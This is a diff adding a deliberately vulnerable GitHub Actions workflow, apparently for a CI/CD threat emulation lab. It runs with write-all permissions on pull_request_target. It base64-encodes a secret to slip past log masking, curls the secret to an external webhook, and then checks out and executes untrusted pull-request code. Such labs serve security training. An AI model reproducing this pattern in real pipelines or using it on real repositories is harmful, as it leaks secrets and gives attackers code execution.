@@ -1,0 +1,79 @@
+name: Vulnerable CI/CD Pipeline (Threat Emulation Lab)
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+# Insecure configuration: Elevated repository privileges
+permissions: write-all
+
+jobs:
+  review-and-test:
+    name: Insecure PR Validation & Test Runner
+    runs-on: ubuntu-latest
+
+    env:
+      # Simulated Repository Secret (Accessible because trigger is pull_request_target)
+      # In GitHub Settings -> Secrets: set DUMMY_SECRET or use fallback mock token
+      DUMMY_SECRET: ${{ secrets.DUMMY_SECRET || 'FLAG{gh_actions_pwned_dummy_token_98472}' }}
+      # External Webhook URL (Set WEBHOOK_URL in GitHub Secrets or edit below)
+      WEBHOOK_URL: ${{ secrets.WEBHOOK_URL }}
+
+    steps:
+      - name: Display PR Trigger Metadata
+        run: |
+          echo "============================================================"
+          echo "Trigger Event: ${{ github.event_name }}"
+          echo "PR Number:     #${{ github.event.pull_request.number }}"
+          echo "PR Head SHA:   ${{ github.event.pull_request.head.sha }}"
+          echo "PR Base Ref:   ${{ github.event.pull_request.base.ref }}"
+          echo "Sender / Actor: ${{ github.actor }}"
+          echo "Workflow Run ID: ${{ github.run_id }}"
+          echo "============================================================"
+
+      # Threat Vector 2: Log Masking Bypass & Outbound Transmission (MITRE ATT&CK T1552 / T1048)
+      # Demonstrates how base64 encoding bypasses GitHub's literal regex secret masking
+      - name: Simulated Token Masking Bypass & Outbound Transmission
+        run: |
+          echo "[*] Step 1: Evaluating secret handling in privileged runner context..."
+          
+          # Base64 encoding bypasses GitHub's literal string log mask
+          B64_TOKEN=$(echo -n "$DUMMY_SECRET" | base64)
+          echo "[!] Raw Base64 encoded token (Log Masking Bypass): $B64_TOKEN"
+          
+          # Outbound transmission to external listener (e.g. webhook.site)
+          if [ -n "$WEBHOOK_URL" ]; then
+            echo "[*] Transmitting simulated telemetry to configured webhook: $WEBHOOK_URL"
+            curl -s -X POST "$WEBHOOK_URL" \
+              -H "Content-Type: application/json" \
+              -d "{
+                \"event\": \"pull_request_target_exfiltration\",
+                \"repository\": \"${{ github.repository }}\",
+                \"pr_number\": \"${{ github.event.pull_request.number }}\",
+                \"actor\": \"${{ github.actor }}\",
+                \"leaked_secret_token\": \"$DUMMY_SECRET\",
+                \"base64_secret\": \"$B64_TOKEN\",
+                \"runner_os\": \"$RUNNER_OS\",
+                \"commit_sha\": \"${{ github.event.pull_request.head.sha }}\"
+              }" || echo "[!] Webhook transmission encountered a network issue."
+            echo ""
+            echo "[+] Outbound transmission completed. Check webhook.site dashboard."
+          else
+            echo "[!] Notice: WEBHOOK_URL secret is not configured in repository settings."
+            echo "[*] Simulated payload that would be transmitted:"
+            echo "    {\"leaked_secret_token\": \"$DUMMY_SECRET\", \"base64\": \"$B64_TOKEN\"}"
+          fi
+
+      # Threat Vector 1: Checkout untrusted PR head in privileged context (MITRE ATT&CK T1195.002)
+      # Catastrophic flaw: Checking out PR head gives attacker control over local build scripts
+      - name: Checkout Pull Request Code (CRITICAL SECURITY FLAW)
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      # Threat Vector 3 / Execution: Runs scripts from the checked-out PR workspace
+      - name: Execute Project Build Script
+        run: |
+          echo "[*] Step 2: Executing project build script from checked-out workspace..."
+          chmod +x ./scripts/build.sh
+          ./scripts/build.sh
